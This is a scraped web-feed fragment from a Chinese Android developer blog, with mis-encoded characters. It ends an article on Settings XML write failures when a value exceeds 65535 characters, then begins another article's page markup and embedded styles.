09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.providers.settings.SettingsState.setValueAttribute(SettingsState.java:1013)
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.providers.settings.SettingsState.writeSingleSetting(SettingsState.java:985)
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.providers.settings.SettingsState.doWriteState(SettingsState.java:872)
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.providers.settings.SettingsState.-$$Nest<span class="hljs-variable">$mdoWriteState</span>(SettingsState.java:0)
09-19 00:14:55.127   524   598 E SettingsState: 	at com.android.providers.settings.SettingsState<span class="hljs-variable">$MyHandler</span>.handleMessage(SettingsState.java:1239)
09-19 00:14:55.127   524   598 E SettingsState: 	at android.os.Handler.dispatchMessage(Handler.java:106)
09-19 00:14:55.127   524   598 E SettingsState: 	at android.os.Looper.loopOnce(Looper.java:205)
09-19 00:14:55.127   524   598 E SettingsState: 	at android.os.Looper.loop(Looper.java:294)
09-19 00:14:55.127   524   598 E SettingsState: 	at android.os.HandlerThread.run(HandlerThread.java:67)
</code></pre>
<h2 data-id="heading-3">æºç åˆ†æï¼š</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/872b6b02409e4987881fec20c9a702f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=s3%2B2rj4vNSJ11O42suZzMVaIa6s%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>å¯ä»¥çœ‹å‡ºæ˜æ˜¾æ˜¯æ‰“å¼€xmlå†™å…¥xmlçš„è¿‡ç¨‹ï¼Œå†çœ‹çœ‹writeSingleSettingæ–¹æ³•ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e95d94bc34d43feaf7b682b4bc15cbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=d9zTikmwZuYdUwLqGcggHg31VXg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>æœ€åè°ƒç”¨åˆ°äº†
frameworks/base/core/java/com/android/internal/util/ArtFastDataOutput.java
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/399a1547b894432b824cb22fcf49bb00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=jezrdivY4nn0gcv4u%2FPcnyyHJV0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>è¿™é‡Œçš„MAX_UNSIGNED_SHORTå€¼æ˜¯65535</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7445d3c32414699a70c73b61d41d4f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=lN7WtasKc6AGviPWI7Kqtx3SprA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
ä¿®æ”¹ä¸€ä¸‹å†™å…¥ä»£ç å˜æˆæ¯”65535å°çš„è¯å°±å¯ä»¥å†™å…¥ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7159e4df757b4cd990cbfb47e4fd73e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=bV4ZqbZeILkTR9Iws5ALOhNygwU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
å¯¼å‡ºxmlçœ‹çœ‹ç»“æœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e884624c98164d8c814a2e331f068e1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODEyNzQ4MjgxNTEyMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767586975&amp;x-signature=8JEibs%2FBNKM2qJq58HeTFRvH0Pc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-4">æ€»ç»“ï¼š</h2>
<p>1ã€settingsç›¸å…³çš„æ•°æ®æœ€åæ˜¯å­˜åœ¨xmlä¸­ï¼Œappå±‚é¢éƒ½æ˜¯é€šè¿‡SettingProviderè°ƒç”¨åˆ°systemserverè¿›ç¨‹è¿›è¡Œä¿å­˜</p>
<p>2ã€xmlä¸­å†™å…¥ç›¸å…³å­—ç¬¦æ—¶å€™ï¼Œå¯¹å­—ç¬¦é•¿åº¦æœ‰é™åˆ¶ï¼Œæ˜¯65535ï¼Œä¸€æ—¦æ¯”è¿™ä¸ªå¤§åˆ™ä¼šå†™å…¥å¼‚å¸¸</p>
<p>æ›´å¤šframeworkæŠ€æœ¯å¹²è´§ï¼Œè¯·å…³æ³¨ä¸‹é¢â€œåƒé‡Œé©¬å­¦æ¡†æ¶â€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Kotlin(3) Flowå¼‚æ­¥æµ]]></title>    <link>https://juejin.cn/post/7588730836865204239</link>    <guid>https://juejin.cn/post/7588730836865204239</guid>    <pubDate>2025-12-29T05:35:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588730836865204239" data-draft-id="7586167377383227418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Kotlin(3) Flowå¼‚æ­¥æµ"/> <meta itemprop="keywords" content="Android,Kotlin"/> <meta itemprop="datePublished" content="2025-12-29T05:35:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="6666v6"/> <meta itemprop="url" content="https://juejin.cn/user/483440848544775"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Kotlin(3) Flowå¼‚æ­¥æµ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/483440848544775/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    6666v6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:35:39.000Z" title="Mon Dec 29 2025 05:35:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa